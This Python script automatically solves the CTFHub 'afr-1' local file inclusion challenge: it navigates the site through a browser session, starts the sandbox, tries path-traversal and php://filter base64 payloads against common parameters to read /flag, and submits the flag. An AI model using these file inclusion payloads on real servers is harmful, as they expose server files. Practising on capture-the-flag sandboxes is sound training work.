#!/usr/bin/env python3
"""Solve afr-1 (L2.2, LFI) on CTFHub."""
import os, sys, time, re, requests, base64
sys.path.insert(0, 'D:/ai')
from tools.feeder.spa_crawler import SpaCrawler
from tools.feeder.ctfhub_flag_submit import submit_flag

CHALLENGE_TITLE = "afr-1"

spa = SpaCrawler()
spa.connect('ctfhub')

# Navigate to challenge page
spa._send('Page.navigate', {'url': 'https://www.ctfhub.com/#/challenge'})
time.sleep(5)

# Drain messages
while spa._recv_any(0.3):
    pass

# Wait for SPA render
for i in range(8):
    body = spa.evaluate('document.body ? document.body.textContent.substring(0, 200) : "no body"')
    print(f"  Wait {i}: {str(body)[:100]}")
    if "We're sorry" not in str(body) and "no body" not in str(body):
        break
    time.sleep(2)
    while spa._recv_any(0.3):
        pass

# Search for challenge by navigating pages — afr-1 likely on early pages
found = False
target_url = None

for page in range(1, 15):
    print(f"Checking page {page}...")
    # Click page button or scroll
    page_js = (
        'var items=document.querySelectorAll(".ant-pagination-item");'
        'for(var i=0;i<items.length;i++){'
        '  if(items[i].textContent.trim()=="%d"){items[i].click();return "clicked page %d";}'
        '}'
        'return "page %d not found";'
    ) % (page, page, page)
    result = spa.evaluate(page_js)
    print(f"  Page click: {result}")
    time.sleep(2)
    while spa._recv_any(0.3):
        pass

    # Check for challenge card
    click_js = (
        'var cards=document.querySelectorAll(".ant-card-hoverable");'
        'var r="not found";'
        'for(var i=0;i<cards.length;i++){'
        '  if(cards[i].textContent.indexOf("%s")>=0){cards[i].click();r="clicked";break;}'
        '}'
        'r'
    ) % CHALLENGE_TITLE
    result = spa.evaluate(click_js)
    print(f"  Find card: {result}")
    if 'clicked' in str(result):
        found = True
        break
    time.sleep(1)

if not found:
    print("FAILED: Challenge card not found in 14 pages")
    spa.close()
    sys.exit(1)

time.sleep(2)
while spa._recv_any(0.3):
    pass

# Start sandbox
start_js = (
    'var btns=document.querySelectorAll(".ant-modal button");'
    'var r="no start";'
    'for(var i=0;i<btns.length;i++){'
    '  var t=btns[i].textContent.trim();'
    '  if(t.indexOf("50")>=0||t.indexOf("开启")>=0||t.indexOf("启动")>=0||'
    '     t.indexOf("环境")>=0&&t.indexOf("续期")<0){'
    '    btns[i].click();r="clicked: "+t;break;'
    '  }'
    '}'
    'r'
)
result = spa.evaluate(start_js)
print(f"Start: {result}")
time.sleep(3)

# Get target URL
for i in range(12):
    time.sleep(2)
    while spa._recv_any(0.3):
        pass
    modal = spa.evaluate(
        'var m=document.querySelector(".ant-modal");'
        'm ? m.textContent : "NO_MODAL"')
    urls = re.findall(r'https?://[^\s\x00-\x1f]+', str(modal))
    for url in urls:
        if 'sandbox' in url and 'ctfhub' in url:
            target_url = url
            break
    if target_url:
        break

if not target_url:
    print(f"FAILED: Could not get target URL. Modal: {str(modal)[:200]}")
    spa.close()
    sys.exit(1)

print(f"Target: {target_url}")

# ── LFI Exploitation ──
flag = None
for param in ["name", "file", "page", "include", "path", "template", "view"]:
    if flag:
        break
    for payload in [
        "/flag",
        "/flag.txt",
        "....//....//....//....//flag",
        "php://filter/convert.base64-encode/resource=/flag",
        "php://filter/convert.base64-encode/resource=flag",
        "php://filter/convert.base64-encode/resource=flag.php",
    ]:
        try:
            r = requests.get(target_url, params={param: payload}, timeout=8)
            m = re.search(r'ctfhub\{[a-f0-9]+\}', r.text)
            if m:
                flag = m.group(0)
                print(f"FLAG FOUND! {flag} via {param}={payload}")
                break
            for b64 in re.findall(r'([A-Za-z0-9+/=]{30,})', r.text):
                try:
                    decoded = base64.b64decode(b64).decode('utf-8', errors='ignore')
                    fm = re.search(r'ctfhub\{[a-f0-9]+\}', decoded)
                    if fm:
                        flag = fm.group(0)
                        print(f"FLAG FOUND! {flag} via {param}={payload} (base64)")
                        break
                except:
                    pass
        except Exception as e:
            pass

if flag:
    ok, msg = submit_flag(CHALLENGE_TITLE, flag)
    print(f"Submit: {ok} - {msg}")
else:
    print("No flag found via LFI")

spa.close()
